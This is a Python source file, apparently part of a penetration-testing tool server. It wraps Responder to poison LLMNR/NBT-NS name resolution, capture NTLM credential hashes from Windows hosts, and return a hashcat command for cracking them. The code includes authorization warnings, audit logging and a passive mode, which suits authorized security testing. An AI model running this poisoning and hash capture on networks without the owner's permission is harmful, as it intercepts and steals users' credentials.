"""Responder LLMNR/NBT-NS poisoning tool wrapper for NTLM hash capture.

WARNING: Responder performs an active man-in-the-middle attack on the local network.
It poisons LLMNR and NBT-NS broadcasts, causing Windows hosts to authenticate to
a rogue listener. This is detectable by network IDS/IPS and SIEM solutions.
Requires explicit written authorization from the network owner.
"""

from __future__ import annotations

import re
import shutil
import time

import structlog
from fastmcp import Context

from tengu.config import get_config
from tengu.executor.process import run_command
from tengu.executor.registry import resolve_tool_path
from tengu.security.audit import get_audit_logger
from tengu.security.rate_limiter import rate_limited

logger = structlog.get_logger(__name__)


async def responder_capture(
    ctx: Context,
    interface: str,
    analyze_only: bool = False,
    capture_duration: int = 60,
    timeout: int | None = None,
) -> dict:
    """Capture NTLM credential hashes via LLMNR/NBT-NS poisoning using Responder.

    Responder listens for LLMNR (Link-Local Multicast Name Resolution) and
    NBT-NS (NetBIOS Name Service) broadcasts and responds with poisoned
    answers, causing Windows hosts to authenticate to our listener.

    Args:
        interface: Network interface to listen on (e.g. "eth0", "wlan0").
        analyze_only: If True, run in analyze mode (no poisoning) — passive observation.
        capture_duration: How many seconds to run Responder (default 60, max 3600).
        timeout: Override global scan timeout.

    Returns:
        Captured NTLM hashes and connection attempts.

    WARNING:
        - This is an active man-in-the-middle attack on the local network.
        - Requires root/sudo privileges and a wired/wireless network interface.
        - Detectable by network intrusion detection systems.
        - Requires explicit human authorization and network owner permission.
        - This tool POISONS network name resolution — use analyze_only=True for passive observation.
    """
    cfg = get_config()
    audit = get_audit_logger()

    # Sanitize interface name — only allow alphanumeric, dash, underscore
    safe_interface = re.sub(r"[^a-zA-Z0-9_\-]", "", interface)[:20]
    if not safe_interface:
        raise ValueError(f"Invalid network interface: {interface!r}")

    # Clamp capture duration to safe bounds
    capture_duration = max(10, min(capture_duration, 3600))

    params: dict[str, object] = {
        "interface": safe_interface,
        "analyze_only": analyze_only,
        "capture_duration": capture_duration,
    }

    # Resolve tool path — try responder first, then Responder.py
    tool_name: str
    tool_path_str: str
    if shutil.which("responder"):
        tool_name = "responder"
        tool_path_str = resolve_tool_path("responder")
    elif shutil.which("Responder.py"):
        tool_name = "Responder.py"
        tool_path_str = resolve_tool_path("Responder.py")
    else:
        tool_name = "responder"
        tool_path_str = resolve_tool_path("responder")

    # Use capture_duration + buffer for effective timeout, but respect global maximum
    effective_timeout = timeout or min(capture_duration + 30, cfg.tools.defaults.scan_timeout)

    # Build args — list only, never shell=True
    args: list[str] = [
        tool_path_str,
        "-I", safe_interface,
        "-r",
        "-d",
        "-w",
    ]
    if analyze_only:
        args.append("-A")

    logger.warning(
        "Responder initiated — LLMNR/NBT-NS poisoning is an active MITM attack",
        interface=safe_interface,
        analyze_only=analyze_only,
    )

    # Note: Responder targets a network interface, not a host — no allowlist check needed
    await ctx.report_progress(
        0, 100, f"Starting Responder on {safe_interface} for {capture_duration}s..."
    )

    async with rate_limited("responder"):
        start = time.monotonic()
        await audit.log_tool_call(tool_name, safe_interface, params, result="started")

        try:
            stdout, stderr, returncode = await run_command(args, timeout=effective_timeout)
        except Exception as exc:
            await audit.log_tool_call(
                tool_name, safe_interface, params, result="failed", error=str(exc)
            )
            raise

        duration = time.monotonic() - start

    await ctx.report_progress(80, 100, "Parsing Responder output...")

    parsed = _parse_responder_output(stdout)

    await ctx.report_progress(100, 100, "Responder capture complete")
    await audit.log_tool_call(
        tool_name, safe_interface, params, result="completed", duration_seconds=duration
    )

    hashcat_hint = (
        "Crack NTLMv2 hashes with: hashcat -m 5600 hashes.txt wordlist.txt"
        if parsed["captured_hashes"]
        else ""
    )

    return {
        "tool": tool_name,
        "interface": safe_interface,
        "analyze_only": analyze_only,
        "capture_duration": capture_duration,
        "duration_seconds": round(duration, 2),
        "captured_hashes_count": len(parsed["captured_hashes"]),
        "captured_hashes": parsed["captured_hashes"],
        "connections": parsed["connections"],
        "hashcat_hint": hashcat_hint,
        "warning": "Responder poisoned LLMNR/NBT-NS — detectable by network IDS.",
        "raw_output_excerpt": stdout[-4000:] if len(stdout) > 4000 else stdout,
    }


def _parse_responder_output(output: str) -> dict:
    """Parse Responder output for captured NTLM hashes and connection events."""
    captured_hashes: list[str] = []
    connections: list[str] = []

    for line in output.splitlines():
        line = line.strip()
        if not line:
            continue
        # NTLMv1/NTLMv2 hash lines contain "::" separator and many colon-delimited fields
        if "::" in line and (
            "NTLMv2" in line
            or "NTLMv1" in line
            or line.count(":") >= 5  # hash format has many colons
        ):
            captured_hashes.append(line)
        elif "[+]" in line or "poisoned" in line.lower():
            connections.append(line)

    return {
        "captured_hashes": captured_hashes[:50],
        "connections": connections[:50],
    }
